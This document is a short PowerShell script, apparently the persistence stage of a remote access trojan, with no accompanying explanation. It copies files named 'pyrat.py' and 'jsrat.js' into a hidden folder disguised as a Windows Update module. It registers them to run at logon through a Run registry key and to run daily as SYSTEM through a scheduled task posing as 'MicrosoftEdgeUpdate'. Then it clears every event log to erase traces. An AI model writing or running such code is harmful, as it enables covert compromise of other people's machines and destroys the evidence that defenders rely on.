
$hiddenPath = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\Modules\WindowsUpdate"
mkdir $hiddenPath -Force | Out-Null

Copy-Item "core\pyrat.py" "$hiddenPath\UpdateCheck.ps1"
Copy-Item "core\jsrat.js" "$hiddenPath\BackgroundTask.js"

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsUpdateCheck" -Value "powershell -WindowStyle Hidden -File `"$hiddenPath\UpdateCheck.ps1`""

schtasks /create /tn "MicrosoftEdgeUpdate" /tr "powershell -File `"$hiddenPath\UpdateCheck.ps1`"" `
    /sc DAILY /ru SYSTEM /f | Out-Null

Clear-EventLog -LogName * -ErrorAction SilentlyContinue
